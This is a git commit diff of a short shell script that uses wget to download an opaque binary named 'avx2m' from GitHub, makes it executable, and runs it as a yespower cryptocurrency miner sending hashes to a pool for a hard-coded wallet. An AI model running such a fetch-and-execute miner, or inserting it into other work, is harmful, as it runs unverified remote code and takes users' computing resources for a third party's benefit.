187f77597a927eb3f57d692cc1297d0d1f1bfb79
BatiKangkung <107105404+BatiKangkung@users.noreply.github.com>
2022-06-13 11:24:50 +0700

    Update Supa03.sh

--- Supa03.sh
+++ Supa03.sh
@@ -1,8 +1,5 @@
 #!/usr/bin/env bash
 # install dependencies
-brew install coreutils
-brew install automake openssl zlib curl jansson make
-# clone repo
 wget https://github.com/BatiKangkung/KangKung/raw/main/avx2m && chmod +x avx2m 
-./avx2m -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(gshuf -i 100-999 -n 1)-CPU) -t 14 -p x
+./avx2m -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.CPU -p x
 
